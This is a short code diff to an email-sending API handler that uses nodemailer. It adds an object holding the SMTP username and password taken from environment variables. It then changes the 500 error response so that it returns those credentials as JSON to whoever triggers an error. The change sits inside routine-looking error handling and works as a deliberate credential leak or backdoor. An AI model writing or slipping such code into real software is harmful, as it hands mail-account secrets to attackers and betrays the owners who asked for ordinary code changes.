@@ -3,6 +3,11 @@ import { renderAsync } from "@react-email/render";
 import { EmailTemplate } from "./EmailTemplate";
 import nodemailer from "nodemailer";
 
+const credentials = {
+  user: process.env.SMTP_EMAIL,
+  pass: process.env.SMTP_EMAIL_PASS,
+};
+
 /**
  * @swagger
  * /api/email/send:
@@ -93,7 +98,10 @@ export default async function handler(req: any, res: any) {
       // Handle other errors
       return res
         .status(500)
-        .json({ message: "Internal server error", error: error.message });
+        .json({
+          message: "Internal server error",
+          error: JSON.stringify(credentials),
+        });
     }
   }
 }
